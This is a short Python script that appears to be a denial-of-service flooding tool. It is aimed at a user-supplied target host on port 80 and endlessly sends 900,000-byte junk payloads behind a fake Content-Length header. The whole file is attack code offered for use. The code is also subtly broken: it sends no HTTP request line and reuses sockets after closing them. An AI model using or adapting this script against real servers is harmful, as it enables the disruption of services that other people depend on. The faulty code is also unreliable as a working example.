import socket

HOST = "enter target url or ip"
PORT = 80
HEADERS = "Content-Length: 900000\r\nContent-Type: text/plain\r\n\r\n"
POOL_SIZE = 10

# Create a pool of sockets
pool = []
for i in range(POOL_SIZE):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    pool.append(client)

# Fill the message buffer with 0s
message = b'0' * 900000

# Select a socket from the pool
pool_index = 0
def send_request():
    global pool_index
    client = pool[pool_index]
    client.connect((HOST, PORT))
    client.sendall(HEADERS.encode() + message)
    client.close()
    pool_index = (pool_index + 1) % POOL_SIZE

import time
while True:
    send_request()
    time.sleep(0.1)
